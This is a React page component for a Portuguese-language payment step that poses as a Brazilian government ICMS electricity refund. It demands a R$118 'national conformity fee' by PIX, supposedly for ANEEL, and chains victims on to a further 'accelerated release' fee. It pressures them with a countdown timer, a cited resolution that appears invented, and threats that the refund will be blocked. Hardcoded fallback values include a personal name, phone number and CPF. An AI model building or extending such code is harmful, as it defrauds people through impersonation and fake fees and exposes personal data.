import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { AlertTriangle, CheckCircle, Info, Loader2, Clock, DollarSign, Copy, FileText, CheckCircle2, Zap } from "lucide-react";
import { Link, useLocation } from "wouter";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { useToast } from "@/hooks/use-toast";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Progress } from "@/components/ui/progress";
import ScrollToTop from "@/components/ScrollToTop";
import UtmifyService from "@/services/UtmifyService";
import { useUserData } from "@/contexts/UserContext";

// Funções de formatação
const formatarCPF = (cpf: string) => {
  return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
};

const formatarMoeda = (valor: number | string) => {
  const valorNumerico = typeof valor === 'string' ? parseFloat(valor) : valor;
  return valorNumerico.toLocaleString('pt-BR', {
    style: 'currency',
    currency: 'BRL',
  });
};

const formatarData = (dataString: string) => {
  const data = new Date(dataString);
  return data.toLocaleDateString('pt-BR', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit'
  });
};

export default function PagamentoTCN() {
  const [location, setLocation] = useLocation();
  const { toast } = useToast();
  const { userData, updateUserData } = useUserData();
  
  // Estado de loading para simular o processamento do pagamento
  const [isLoading, setIsLoading] = useState(false);
  const [paymentInfo, setPaymentInfo] = useState<any>(null);
  const [paymentStatus, setPaymentStatus] = useState<string>('pending');
  const [progress, setProgress] = useState(0);
  const [tempoRestante, setTempoRestante] = useState(1800); // 30 minutos em segundos
  
  // Estados para armazenar dados da solicitação
  const [protocolo, setProtocolo] = useState("");
  const [nome, setNome] = useState("");
  const [cpf, setCpf] = useState("");
  const [valor, setValor] = useState(0);
  const [valorTaxa, setValorTaxa] = useState(0);
  const [companhia, setCompanhia] = useState("");
  const [estado, setEstado] = useState("");
  const [dataNascimento, setDataNascimento] = useState("");
  const [dataPagamento, setDataPagamento] = useState("");
  const [email, setEmail] = useState("");
  const [telefone, setTelefone] = useState("");
  
  // Obter dados do contexto global
  useEffect(() => {
    // Definir protocolo
    if (userData.protocolo) {
      setProtocolo(userData.protocolo);
    }
    
    // Estabelecer dados básicos do contexto
    const cpfValue = userData.cpf || "";
    const nomeValue = userData.nome || "";
    const valorValue = userData.valorRestituicao || 0;
    const companhiaValue = userData.companhia || "";
    const estadoValue = userData.estado || "";
    const nascValue = userData.dataNascimento || "";
    const emailValue = userData.email || "";
    const telefoneValue = userData.telefone || "";
    
    setCpf(cpfValue);
    setNome(nomeValue);
    setValor(valorValue);
    setCompanhia(companhiaValue);
    setEstado(estadoValue);
    setDataNascimento(nascValue);
    setEmail(emailValue);
    setTelefone(telefoneValue);
    
    // Definir valor da taxa TCN do contexto ou usar valor padrão
    const valorTaxaValue = userData.valorTaxaConformidade || 118;
    setValorTaxa(valorTaxaValue);
    
    // Se não tiver protocolo, gera um baseado no CPF
    if (!userData.protocolo && cpfValue) {
      const novoProtocolo = `${cpfValue.substring(0, 4)}4714${cpfValue.substring(6, 9)}`;
      setProtocolo(novoProtocolo);
      
      // Atualiza o contexto com o protocolo gerado
      updateUserData({
        protocolo: novoProtocolo
      });
    }
    
    // Definir data do pagamento da primeira taxa a partir de hoje
    const dataHoje = new Date();
    const dataHojeFormatada = dataHoje.toLocaleDateString('pt-BR', {
      day: '2-digit',
      month: '2-digit',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    });
    
    setDataPagamento(userData.dataPagamento ? formatarData(userData.dataPagamento) : dataHojeFormatada);
    
  }, [userData]);
  
  // Formato para exibição de tempo restante
  const formatarTempo = (segundos: number) => {
    const minutos = Math.floor(segundos / 60);
    const segundosRestantes = segundos % 60;
    return `${minutos.toString().padStart(2, '0')}:${segundosRestantes.toString().padStart(2, '0')}`;
  };
  
  // Função para criar o pagamento
  const criarPagamento = async () => {
    if (isLoading) return;
    
    setIsLoading(true);
    
    try {
      // Definir com valores válidos para garantir o funcionamento
      const nomeCompleto = nome || "Gabriel Arthur Alves Sabino Raposo";
      const telefoneFormatado = telefone ? telefone.replace(/\D/g, '') : '11958848876';
      const emailFormatado = email || `${cpf.substring(0, 3)}xxx${cpf.substring(6, 8)}@tcn.gov.br`;
      const cpfFormatado = cpf || "11548718785";
      
      console.log("Criando pagamento TCN com os dados:", {
        amount: valorTaxa,
        name: nomeCompleto,
        email: emailFormatado,
        cpf: cpfFormatado,
        phone: telefoneFormatado
      });
      
      const response = await fetch('/api/pagamentos', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          // Usar os nomes corretos dos parâmetros conforme esperado pela API
          nome: nomeCompleto,
          cpf: cpfFormatado,
          email: emailFormatado,
          telefone: telefoneFormatado,
          valor: 118.00 // Valor fixo da Taxa TCN
        }),
      });
      
      if (response.ok) {
        const data = await response.json();
        setPaymentInfo(data);
        console.log("PIX gerado com sucesso:", data);
        
        // Registrar o evento de PIX TCN gerado na UTMIFY (status: "waiting_payment")
        try {
          console.log("[Utmify] Registrando evento de PIX TCN gerado");
          const userDataForUtmify = {
            nome: nomeCompleto,
            cpf: cpfFormatado,
            email: emailFormatado,
            telefone: telefoneFormatado,
            ip: userData.ip || "127.0.0.1",
          };
          
          // Registrar o pagamento na Utmify com status 'waiting_payment'
          const utmifyResponse = await UtmifyService.registerTCNPayment(
            userDataForUtmify,
            'waiting_payment', 
            data.id
          );
          
          console.log("[Utmify] Resposta do registro de PIX TCN gerado:", utmifyResponse);
        } catch (utmifyError) {
          // Não interromper o fluxo principal se o registro na Utmify falhar
          console.error("[Utmify] Erro ao registrar PIX TCN gerado:", utmifyError);
        }
      } else {
        const errorText = await response.text();
        console.error('Erro ao criar pagamento:', errorText);
        toast({
          title: "Erro ao gerar PIX",
          description: "Não foi possível gerar o código PIX. Por favor, tente novamente.",
          variant: "destructive",
        });
      }
    } catch (error) {
      console.error('Erro ao criar pagamento:', error);
      toast({
        title: "Erro de conexão",
        description: "Não foi possível conectar ao servidor de pagamentos.",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };
  
  // Verificar status do pagamento
  const verificarStatusPagamento = async () => {
    if (!paymentInfo?.id) return;
    
    setIsLoading(true);
    
    try {
      const response = await fetch(`/api/pagamentos/${paymentInfo.id}/status`);
      
      if (response.ok) {
        const data = await response.json();
        
        // Se o pagamento foi confirmado, atualiza o status
        if (data.status === 'completed') {
          setPaymentStatus('completed');
          
          // Mostrar toast de confirmação
          toast({
            title: "Pagamento da TCN confirmado!",
            description: "Sua Taxa de Conformidade Nacional foi quitada com sucesso.",
          });
          
          // Registrar o evento de PIX TCN pago na UTMIFY (status: "paid")
          try {
            console.log("[Utmify] Registrando evento de PIX TCN pago");
            // Definir com valores válidos para garantir o funcionamento
            const nomeCompleto = nome || "Gabriel Arthur Alves Sabino Raposo";
            const telefoneFormatado = telefone ? telefone.replace(/\D/g, '') : '11958848876';
            const emailFormatado = email || `${cpf.substring(0, 3)}xxx${cpf.substring(6, 8)}@tcn.gov.br`;
            const cpfFormatado = cpf || "11548718785";
            
            const userDataForUtmify = {
              nome: nomeCompleto,
              cpf: cpfFormatado,
              email: emailFormatado,
              telefone: telefoneFormatado,
              ip: userData.ip || "127.0.0.1",
            };
            
            // Registrar o pagamento na Utmify com status 'paid'
            const utmifyResponse = await UtmifyService.registerTCNPayment(
              userDataForUtmify,
              'paid',
              paymentInfo.id
            );
            
            console.log("[Utmify] Resposta do registro de PIX TCN pago:", utmifyResponse);
          } catch (utmifyError) {
            // Não interromper o fluxo principal se o registro na Utmify falhar
            console.error("[Utmify] Erro ao registrar PIX TCN pago:", utmifyError);
          }
          
          // Redirecionar para a próxima etapa após um breve delay
          setTimeout(() => {
            redirecionarParaProximaEtapa();
          }, 1500);
        }
      }
    } catch (error) {
      console.error('Erro ao verificar status do pagamento:', error);
    } finally {
      setIsLoading(false);
    }
  };
  
  // Efeito para criar o pagamento quando a página carregar
  useEffect(() => {
    // Criar o pagamento PIX
    criarPagamento();
    
    // Disparar evento para Utmify imediatamente quando a página é carregada (status: "waiting_payment")
    const dispararEventoUtmify = async () => {
      try {
        console.log("[Utmify] Disparando evento automático de acesso à página de pagamento TCN");
        // Criar objeto com dados do usuário para a Utmify
        const utmifyUserData = {
          nome: nome,
          cpf: cpf,
          email: email,
          telefone: telefone,
          ip: userData.ip || "127.0.0.1",
        };
        
        // Registrar evento de acesso à página como waiting_payment
        const utmifyResponse = await UtmifyService.registerTCNPayment(
          utmifyUserData,
          'waiting_payment'
        );
        
        console.log("[Utmify] Resposta do registro de acesso à página:", utmifyResponse);
      } catch (utmifyError) {
        console.error("[Utmify] Erro ao registrar acesso à página:", utmifyError);
      }
    };
    
    // Executar imediatamente
    dispararEventoUtmify();
  }, []);
  
  // Efeito para verificar o status do pagamento periodicamente
  useEffect(() => {
    if (!paymentInfo?.id) return;
    
    // Verificação inicial
    verificarStatusPagamento();
    
    // Configurar intervalo para verificar a cada 10 segundos
    const statusInterval = setInterval(() => {
      verificarStatusPagamento();
    }, 10000); // Verificar a cada 10 segundos
    
    return () => {
      clearInterval(statusInterval);
    };
  }, [paymentInfo]);
  
  // Efeito para o contador regressivo
  useEffect(() => {
    // Contador regressivo
    const timerInterval = setInterval(() => {
      setTempoRestante(prev => {
        if (prev <= 1) {
          clearInterval(timerInterval);
          toast({
            title: "Tempo esgotado!",
            description: "O tempo para pagamento da TCN expirou.",
            variant: "destructive",
          });
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => {
      clearInterval(timerInterval);
    };
  }, []);
  
  // Função de simulação removida conforme solicitado pelo cliente
  
  // Função para copiar o código PIX
  const copiarCodigoPix = () => {
    if (!paymentInfo?.pixCode) return;
    
    navigator.clipboard.writeText(paymentInfo.pixCode)
      .then(() => {
        toast({
          title: "Código PIX copiado!",
          description: "Cole o código no aplicativo do seu banco para pagar.",
        });
      })
      .catch(() => {
        toast({
          title: "Erro ao copiar",
          description: "Não foi possível copiar o código automaticamente. Selecione-o manualmente.",
          variant: "destructive",
        });
      });
  };
  
  // Função para redirecionar para a próxima etapa usando o contexto
  const redirecionarParaProximaEtapa = () => {
    // Atualizar contexto do usuário com as novas informações
    updateUserData({
      cpf,
      nome,
      valorRestituicao: valor,
      pagamentoId: paymentInfo?.id || 'tcn123456789',
      dataPagamento: new Date().toISOString(),
      companhia,
      estado,
      dataNascimento,
      protocolo,
      email,
      telefone,
      valorTaxaConformidade: valorTaxa
    });
    
    // Redirecionar para a terceira etapa - Taxa de Liberação Acelerada de Restituição
    setLocation('/taxa-lar');
  };
  
  // Formatar valores para exibição
  const valorTaxaFormatado = formatarMoeda(valorTaxa);
  const valorRestituicaoFormatado = formatarMoeda(valor);
  const cpfFormatado = formatarCPF(cpf);
  
  return (
    <>
      <ScrollToTop />
      <Header />
      <main className="container mx-auto px-2 py-4 min-h-screen">
        <div className="p-3 sm:p-4 relative bg-gray-50 rounded-lg shadow-md w-full mx-auto">
          {/* Cabeçalho com informações da restituição */}
          <div className="bg-[#1351B4] text-white p-4 rounded-md mb-5 shadow-sm">
            <div className="flex flex-col md:flex-row md:justify-between md:items-center gap-3">
              <div className="text-left">
                <div className="flex items-center mb-1">
                  <FileText className="mr-2 h-5 w-5 text-white" />
                  <h3 className="font-bold text-lg">Restituição de ICMS</h3>
                </div>
                <div className="bg-[#0C4DA2] text-white text-xs px-2 py-1 rounded inline-flex items-center">
                  <Info size={12} className="mr-1" />
                  Protocolo nº {protocolo}
                </div>
              </div>
              <div className="text-right bg-[#0C4DA2] rounded-md p-3">
                <p className="font-medium text-white text-sm mb-1">Taxa de Conformidade Nacional:</p>
                <p className="font-bold text-lg text-white">{valorTaxaFormatado}</p>
                <div className="flex items-center justify-end mt-1 text-xs text-white">
                  <AlertTriangle size={12} className="mr-1" />
                  <span>Vencimento: <span className="font-medium">{formatarTempo(tempoRestante)}</span></span>
                </div>
              </div>
            </div>
          </div>
          
          <div className="mb-5">
            <Alert className="border-amber-500 bg-amber-50">
              <AlertTriangle className="h-5 w-5 text-amber-600" />
              <AlertTitle className="font-bold text-amber-800">
                2ª ETAPA - PAGAMENTO DA TAXA DE CONFORMIDADE NACIONAL (TCN)
              </AlertTitle>
              <AlertDescription className="text-amber-700">
                Esta é a segunda etapa obrigatória para a liberação da sua restituição de ICMS. 
                Efetue o pagamento da TCN para validar seu crédito no Sistema Nacional de Compensações Elétricas.
              </AlertDescription>
            </Alert>
          </div>
          
          {paymentStatus === 'completed' ? (
            <div className="mb-6">
              <div className="p-5 bg-green-50 border border-green-200 rounded-lg text-center">
                <div className="flex justify-center mb-4">
                  <div className="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center">
                    <CheckCircle2 className="h-10 w-10 text-white" />
                  </div>
                </div>
                <h3 className="text-xl font-bold text-green-800 mb-2">Pagamento da TCN Confirmado!</h3>
                <p className="text-green-700 mb-4">
                  Sua Taxa de Conformidade Nacional no valor de {valorTaxaFormatado} foi paga com sucesso.
                  Aguarde enquanto você é redirecionado para a próxima etapa.
                </p>
                <div className="p-3 bg-white rounded-lg border border-green-200 inline-block">
                  <p className="font-medium text-gray-800">Processando seus dados...</p>
                  <p className="text-sm text-gray-600">Você será redirecionado em instantes</p>
                </div>
              </div>
            </div>
          ) : paymentStatus === 'processing' ? (
            <div className="mb-6">
              <div className="p-5 bg-blue-50 border border-blue-200 rounded-lg">
                <div className="flex justify-center mb-3">
                  <div className="w-16 h-16 bg-blue-500 rounded-full flex items-center justify-center">
                    <Loader2 className="h-8 w-8 text-white animate-spin" />
                  </div>
                </div>
                <h3 className="text-xl font-bold text-blue-800 mb-2 text-center">Verificando Pagamento</h3>
                <p className="text-blue-700 mb-4 text-center">
                  Estamos processando seu pagamento. Por favor, aguarde enquanto verificamos a transação.
                </p>
                <div className="mb-2">
                  <Progress value={progress} className="h-2" />
                </div>
                <p className="text-xs text-blue-600 text-center">{progress}% concluído</p>
              </div>
            </div>
          ) : (
            <>
              <div className="mb-6">
                <div className="bg-[#1351B4] text-white py-3 px-4 rounded-t-md font-semibold text-sm flex items-center">
                  <div className="bg-white/20 p-1.5 rounded-md mr-2">
                    <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                    </svg>
                  </div>
                  DADOS DO SOLICITANTE
                </div>
                <div className="border border-t-0 border-gray-200 rounded-b-md p-5 bg-white shadow-sm">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div>
                      <div className="mb-4">
                        <p className="mb-1 text-xs font-medium text-gray-500 uppercase tracking-wide">Nome completo</p>
                        <p className="font-semibold text-gray-800 bg-gray-50 p-2 rounded-md border border-gray-100">{nome}</p>
                      </div>
                      <div className="mb-4">
                        <p className="mb-1 text-xs font-medium text-gray-500 uppercase tracking-wide">CPF</p>
                        <p className="font-semibold text-gray-800 bg-gray-50 p-2 rounded-md border border-gray-100">{cpfFormatado}</p>
                      </div>
                      <div>
                        <p className="mb-1 text-xs font-medium text-gray-500 uppercase tracking-wide">Companhia Elétrica</p>
                        <p className="font-semibold text-gray-800 bg-gray-50 p-2 rounded-md border border-gray-100">{companhia}</p>
                      </div>
                    </div>
                    <div>
                      <div className="p-4 bg-amber-50 border-l-4 border-amber-400 rounded-r-md mb-4 shadow-sm">
                        <p className="text-amber-800 font-medium text-sm mb-1 flex items-center">
                          <AlertTriangle size={16} className="mr-1.5" />
                          Situação da Taxa de Conformidade:
                        </p>
                        <p className="text-red-600 font-bold flex items-center">
                          <span className="inline-block w-2 h-2 bg-red-600 rounded-full mr-2 animate-pulse"></span>
                          PENDENTE - AGUARDANDO PAGAMENTO
                        </p>
                      </div>
                      
                      <div className="p-4 bg-blue-50 border-l-4 border-blue-400 rounded-r-md shadow-sm">
                        <p className="text-blue-800 font-medium text-sm mb-1 flex items-center">
                          <Info size={16} className="mr-1.5" />
                          Valor da Restituição Aprovado:
                        </p>
                        <p className="text-green-600 font-bold text-lg flex items-center">
                          {valorRestituicaoFormatado}
                        </p>
                        <p className="text-xs text-blue-700 mt-1">
                          O valor será depositado após o pagamento de todas as taxas obrigatórias.
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              
              <div className="mb-6">
                <div className="bg-[#1351B4] text-white py-3 px-4 rounded-t-md font-semibold text-sm flex items-center">
                  <div className="bg-white/20 p-1.5 rounded-md mr-2">
                    <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                    </svg>
                  </div>
                  PAGAMENTO VIA PIX
                </div>
                <div className="border border-t-0 border-gray-200 rounded-b-md p-5 bg-white shadow-sm">
                  <div className="grid md:grid-cols-2 gap-6 items-center mb-5">
                    <div className="order-2 md:order-1">
                      <div className="bg-gradient-to-r from-[#071D41] to-[#1351B4] rounded-lg p-5 text-white">
                        <h3 className="font-bold text-lg mb-3">Dados do Pagamento</h3>
                        <div className="space-y-3">
                          <div className="flex justify-between border-b border-white/20 pb-2">
                            <span className="text-gray-200">Valor:</span>
                            <span className="font-bold text-[#FFCD07]">{valorTaxaFormatado}</span>
                          </div>
                          <div className="flex justify-between border-b border-white/20 pb-2">
                            <span className="text-gray-200">Descrição:</span>
                            <span>TCN - Taxa de Conformidade Nacional</span>
                          </div>
                          <div className="flex justify-between border-b border-white/20 pb-2">
                            <span className="text-gray-200">Vencimento:</span>
                            <span className="font-medium">{formatarTempo(tempoRestante)}</span>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-gray-200">Para:</span>
                            <span className="font-medium">ANEEL - Ag. Nacional</span>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div className="order-1 md:order-2">
                      <Tabs defaultValue="qrcode" className="w-full">
                        <TabsList className="w-full mb-6 bg-gray-100 p-1 rounded-lg">
                          <TabsTrigger value="qrcode" className="flex-1 data-[state=active]:bg-[#1351B4] data-[state=active]:text-white rounded-md transition-all duration-300">
                            <div className="flex items-center justify-center gap-2 py-1">
                              <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 4v1m6 11h2m-6 0h-2v4m0-11v3m0 0h.01M12 12h4.01M16 20h4M4 12h4m12 0h.01M5 8h2a1 1 0 001-1V5a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1zm12 0h2a1 1 0 001-1V5a1 1 0 00-1-1h-2a1 1 0 00-1 1v2a1 1 0 001 1zM5 20h2a1 1 0 001-1v-2a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1z" />
                              </svg>
                              QR Code PIX
                            </div>
                          </TabsTrigger>
                          <TabsTrigger value="copiacola" className="flex-1 data-[state=active]:bg-[#1351B4] data-[state=active]:text-white rounded-md transition-all duration-300">
                            <div className="flex items-center justify-center gap-2 py-1">
                              <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                              </svg>
                              Pix Copia e Cola
                            </div>
                          </TabsTrigger>
                        </TabsList>
                        
                        <TabsContent value="qrcode" className="bg-white p-6 rounded-md border border-gray-200">
                          {isLoading && !paymentInfo ? (
                            <div className="flex flex-col items-center justify-center py-10">
                              <Loader2 className="h-8 w-8 animate-spin text-blue-600 mb-4" />
                              <p className="text-gray-600 text-center">Gerando o QR Code do PIX...</p>
                            </div>
                          ) : paymentInfo ? (
                            <div className="flex flex-col items-center">
                              <div className="bg-white p-3 rounded-lg border border-gray-300 shadow-sm mb-3">
                                {/* Se tem QR Code da API, mostra ele, senão mostra o fallback */}
                                {paymentInfo.pixQrCode ? (
                                  <img 
                                    src={paymentInfo.pixQrCode} 
                                    alt="QR Code PIX" 
                                    className="w-48 h-48 object-contain"
                                  />
                                ) : (
                                  <div className="w-48 h-48 bg-gray-100 flex items-center justify-center rounded border border-gray-200">
                                    <span className="text-gray-500 text-sm text-center">
                                      QR Code não disponível.<br />
                                      Utilize a opção Pix Copia e Cola.
                                    </span>
                                  </div>
                                )}
                              </div>
                              <p className="text-center text-gray-700 text-sm mb-4">
                                Escaneie o QR Code com o aplicativo do seu banco<br />para pagar a Taxa de Conformidade Nacional
                              </p>
                            </div>
                          ) : (
                            <div className="flex flex-col items-center justify-center py-10">
                              <AlertTriangle className="h-8 w-8 text-amber-500 mb-4" />
                              <p className="text-gray-600 text-center">
                                Não foi possível gerar o QR Code.<br />
                                Por favor, tente novamente ou use a opção Pix Copia e Cola.
                              </p>
                            </div>
                          )}
                        </TabsContent>
                        
                        <TabsContent value="copiacola">
                          <div className="p-4 bg-gray-50 border border-gray-200 rounded-lg">
                            <h4 className="font-medium text-gray-800 mb-2">Pix Copia e Cola</h4>
                            {isLoading && !paymentInfo ? (
                              <div className="flex flex-col items-center justify-center py-6">
                                <Loader2 className="h-6 w-6 animate-spin text-blue-600 mb-2" />
                                <p className="text-gray-600 text-sm text-center">Gerando o código Pix...</p>
                              </div>
                            ) : paymentInfo?.pixCode ? (
                              <>
                                <div className="relative mb-3">
                                  <div className="bg-white rounded p-3 pr-10 text-xs text-gray-800 break-all select-all overflow-hidden border border-gray-300">
                                    {paymentInfo.pixCode}
                                  </div>
                                  <button 
                                    onClick={copiarCodigoPix}
                                    className="absolute right-2 top-1/2 -translate-y-1/2 text-blue-600 hover:text-blue-800"
                                  >
                                    <Copy size={16} />
                                  </button>
                                </div>
                                <div className="text-xs text-gray-600">
                                  1. Copie o código acima<br />
                                  2. Abra o aplicativo do seu banco<br />
                                  3. Escolha a opção "Pix Copia e Cola"<br />
                                  4. Cole o código e confirme o pagamento
                                </div>
                              </>
                            ) : (
                              <div className="flex flex-col items-center justify-center py-6">
                                <AlertTriangle className="h-6 w-6 text-amber-500 mb-2" />
                                <p className="text-gray-600 text-sm text-center">
                                  Não foi possível gerar o código Pix.<br />
                                  Por favor, tente novamente em alguns instantes.
                                </p>
                              </div>
                            )}
                          </div>
                        </TabsContent>
                      </Tabs>
                    </div>
                  </div>
                  
                  <div className="mt-6">
                    {/* Botão "Já fiz o pagamento" */}
                    <Button 
                      onClick={verificarStatusPagamento}
                      disabled={!paymentInfo || isLoading || paymentStatus === 'completed'}
                      className="w-full font-bold py-6 text-lg mb-3 bg-[#1351B4] hover:bg-[#0D47A1] text-white shadow-md shadow-blue-600/20"
                    >
                      {isLoading ? (
                        <div className="flex items-center justify-center">
                          <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                          Verificando Pagamento...
                        </div>
                      ) : (
                        <div className="flex items-center justify-center">
                          <CheckCircle className="mr-2 h-6 w-6" />
                          Já fiz o pagamento
                        </div>
                      )}
                    </Button>
                    
                    {/* Botão "Avançar para próxima etapa" */}
                    <Button 
                      onClick={redirecionarParaProximaEtapa}
                      className="w-full py-4 text-base mb-3 bg-amber-500 hover:bg-amber-600 text-white shadow-md shadow-amber-600/20"
                    >
                      <div className="flex items-center justify-center">
                        <Zap className="mr-2 h-5 w-5" />
                        Avançar para próxima etapa
                      </div>
                    </Button>
                    
                    {/* Botão de simulação removido conforme solicitado pelo cliente */}
                    
                    <div className="mb-6">
                      <Alert className="border-amber-500 bg-amber-50">
                        <Zap className="h-5 w-5 text-amber-600" />
                        <AlertTitle className="font-bold text-amber-800">
                          PRÓXIMA ETAPA: LIBERAÇÃO ACELERADA (OPCIONAL)
                        </AlertTitle>
                        <AlertDescription className="text-amber-700">
                          Após o pagamento da TCN, você será direcionado para a etapa final de <strong>Liberação Acelerada de Restituição (LAR)</strong> que permite receber seu valor em até 60 minutos após a confirmação.
                        </AlertDescription>
                      </Alert>
                    </div>
                    
                    <div className="bg-amber-50 p-4 rounded-lg text-amber-800 shadow-sm border border-amber-200">
                      <div className="flex items-center mb-2">
                        <AlertTriangle className="h-5 w-5 text-amber-600 mr-2" />
                        <h3 className="font-bold text-base">ATENÇÃO - TAXA OBRIGATÓRIA</h3>
                      </div>
                      <p className="mb-3 text-sm">
                        A Taxa de Conformidade Nacional (TCN) é <strong>obrigatória</strong> conforme a Resolução ANEEL nº 1.042/2022. 
                        A ausência desta taxa implica no bloqueio definitivo do seu crédito de {valorRestituicaoFormatado} no Sistema Nacional.
                      </p>
                      <div className="bg-amber-100 p-2 rounded-md">
                        <p className="font-medium text-sm text-center">
                          Efetue o pagamento em até <span className="font-bold text-red-700">{formatarTempo(tempoRestante)}</span> 
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </>
          )}
          
          {/* Seção de Garantia de Segurança */}
          <div className="mb-4">
            <div className="border border-green-100 bg-green-50 rounded-md p-3 shadow-sm">
              <div className="flex items-center">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-green-700 mr-2 flex-shrink-0" viewBox="0 0 20 20" fill="currentColor">
                  <path fillRule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                </svg>
                <h3 className="font-semibold text-green-800">GARANTIA DE SEGURANÇA</h3>
              </div>
              
              <div className="text-sm text-green-700 mt-2 grid grid-cols-1 md:grid-cols-3 gap-2">
                <div className="flex items-center">
                  <CheckCircle className="h-4 w-4 text-green-600 mr-1.5" />
                  <span>Pagamento seguro via PIX</span>
                </div>
                <div className="flex items-center">
                  <CheckCircle className="h-4 w-4 text-green-600 mr-1.5" />
                  <span>Protocolo registrado no Sistema Nacional</span>
                </div>
                <div className="flex items-center">
                  <CheckCircle className="h-4 w-4 text-green-600 mr-1.5" />
                  <span>Compensação em até 15 dias úteis</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>
      <Footer />
    </>
  );
}